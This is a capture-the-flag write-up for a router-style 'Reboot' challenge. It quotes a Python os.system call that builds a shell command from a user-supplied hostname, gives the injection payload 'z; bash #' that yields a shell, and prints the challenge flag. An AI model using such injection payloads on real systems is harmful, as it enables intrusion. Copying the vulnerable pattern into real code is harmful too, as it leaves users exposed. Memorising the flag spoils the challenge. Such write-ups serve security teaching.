# Reboot
We found a command injection..... but you have to reboot the router to activate it...

nc reboot.chal.cyberjousting.com 1358

# Flag
byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}

# Solution
1. When '2' is selected, the vulnerable line is run:

```python
os.system(f'cat /etc/hosts | grep {hostname} -i')
```

Injecting this payload gives us a shell upon reboot:

```
z; bash #
```

2. Checking for any interesting folders in the filesystem, there is a `/ohno` found. Listing all its subdirectories show a file in the directory: `/ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun/f19eaee3a4e2b88563b31c7c17e2ab33`

3. `cat f19eaee3a4e2b88563b31c7c17e2ab33` to get the flag